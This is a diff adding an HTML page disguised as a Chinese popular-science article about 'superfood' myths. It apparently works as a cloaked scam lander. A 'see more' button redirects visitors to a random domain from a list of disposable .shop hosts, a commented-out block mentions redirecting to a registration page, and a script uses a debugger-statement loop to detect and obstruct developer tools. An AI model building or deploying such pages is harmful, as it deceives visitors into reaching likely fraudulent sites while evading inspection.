@@ -1,0 +1,165 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>那些“超级食物”背后的真相</title>
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f7f8fc 0%, #eef2ff 100%);
+            font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+        }
+        .article {
+            padding: 20px;
+        }
+        .article h1 {font-size: 20px;text-align: center;line-height: 40px;}
+        .article p {font-size: 14px;color: #333;line-height: 24px;text-indent: 2em;}
+        .card {
+            background: #ffffff;
+            width: 90%;
+            max-width: 480px;
+            padding: 48px 32px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            text-align: center;
+        }
+        /* Loading旋转动画 */
+        .loader {
+            width: 56px;
+            height: 56px;
+            border: 4px solid #e6edff;
+            border-top-color: #3671e9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin {
+            to {transform: rotate(360deg);}
+        }
+        h2 {
+            font-size: 24px;
+            color: #1d2939;
+            margin-bottom: 12px;
+        }
+        .desc {
+            font-size: 15px;
+            color: #667085;
+            margin-bottom: 28px;
+            line-height: 1.6;
+        }
+        .error-text {
+            font-size: 18px;
+            color: #d92d20;
+            margin-bottom: 20px;
+        }
+        .btn-link {
+            display: inline-block;
+            padding: 14px 36px;
+            background-color: #3671e9;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.25s ease;
+        }
+        .btn-link:hover {
+            background-color: #2859c4;
+        }
+        .tip-small {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #98a2b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="article">
+        <h1>那些“超级食物”背后的真相</h1>
+        <p>“日常喝点酵素，能减肥，还能改善排毒、肠道菌群。”</p>
+        <p>“多喝点红酒，里面的白藜芦醇成分可以预防心血管疾病，有助长寿。”</p>
+        <p>“吃燕窝可以美容抗衰老、补充胶原蛋白。”</p>
+        <p>“最近青汁特别流行，成了网红保健食品，听说能减肥呢！”</p>
+        <p>“刚生完孩子，我妈给我买了阿胶让我补血补铁、调理身体。”</p>
+        <p>这些话是不是听起来很耳熟？这些据说有神奇功效的食物你都吃过吗？</p>
+        <p>近几年，“养生”早已不仅仅是中老年人的标配，各年龄段的人群都对养生有一套自己的理解，年轻人忙于排毒、养颜和减肥，中老年人群则忙着追逐长寿、抗氧化和调理慢性病。对于这些“追求”，大家都不约而同地将目光锁定了一些，或是口耳相传或是被广告广而告之的“超级食物”。可是，这些普遍价格不菲的“超级食物”真的有那么神奇吗？</p>
+        <p>11月28日，北京青年报社“食今不昧”和中国食品科学技术学会联合主办，由烟台欣合企业食品有限公司和北京青年报读者俱乐部协办的“食品安全科普进社区”系列活动，走进了北京朝阳区麦子店枣营南里社区。</p>
+        <a href="javascript:get_more();" style="position:fixed;left:50%;top:50%;transform: translate(-50%, -50%);font-size:16px;background:#333;color:#fff;display:block;width:120px;height:40px;text-align:center;line-height:40px;text-decoration:none;border-radius:5px;">点击查看更多</a>
+    </div>
+    <!-- <div class="card">
+        <div class="loader" id="loadingIcon"></div>
+        <h2>正在前往注册页面</h2>
+        <p class="desc">系统正在分配最优线路，请稍候片刻</p>
+        <p class="error-text" id="errorMsg"></p>
+        <a href="" class="btn-link" id="manualLink" style="display:none;">手动点击跳转</a>
+        <p class="tip-small">若长时间无响应，请点击上方按钮</p>
+    </div> -->
+
+<script>
+    const devtoolsDetector = /./;
+    devtoolsDetector.opened = false;
+    const checkDevtools = () => {
+      while (true) {
+        const start = Date.now();
+        debugger; // 打开调试器时这里会暂停
+        const end = Date.now();
+        // consoleLog(end - start);
+        if (end - start < 20) {
+          break;                          // 正常执行，未开调试器
+        } else {
+          // consoleLog('is debugger');
+          devtoolsDetector.opened = true; // 停顿 >= 20ms → 判定调试器已打开
+        }
+      }
+    };
+    // 每 100ms 用 console.log 触发 toString 陷阱；发现调试器就再跑 debugger 检测并清空控制台
+    setInterval(() => {
+      // console.log(devtoolsDetector);
+      if (devtoolsDetector.opened) {
+        checkDevtools();
+        console.clear();
+      }
+    }, 100);
+    checkDevtools(); // 执行 debugger 检测
+    const urls = [
+        'https://z4b9p5o4.txbm.shop',
+        'https://k8f7p5n4.txbm.shop',
+        'https://s8o0j8k7.txbm.shop',
+        'https://t2e5n8z4.txbm.shop',
+        'https://z1r0q1p7.txbm.shop',
+        'https://3iomzwpit6ynp3y2dj.txbm.shop',
+        'https://392grqcz23b3yukh15.txbm.shop',
+        'https://3nzbv9w6eloq7v5foh.txbm.shop',
+        'https://36b25dhsdnj6604v60.txbm.shop',
+        'https://3bfu2k6jvitsmeikvy.txbm.shop',
+        'https://3ape4iwsgaxkakxdwk.txbm.shop',
+        'https://3pgb0so9jeowxihzab.txbm.shop',
+        'https://39stdiqxmcpalgsnzy.txbm.shop',
+        'https://3e14lldizceut.zhizhi.shop',
+        'https://3d568738fzajh.zhizhi.shop',
+        'https://3gz004ujseb9z.zhizhi.shop',
+        'https://37zuhm5yjgzh4.zhizhi.shop',
+        'https://3ajq10qdg2awo.zhizhi.shop',
+        'https://3hblzm6f7a1om.zhizhi.shop',
+        'https://3s1n153mdlcjn.zhizhi.shop',
+        'https://3psvsakssllzl.zhizhi.shop',
+        'https://3fd3s0z5i61dx.zhizhi.shop'
+    ];
+    function get_more(){
+        window.location.href = urls[Math.floor(Math.random() * urls.length)];
+    }
+</script>
+</body>
+</html>
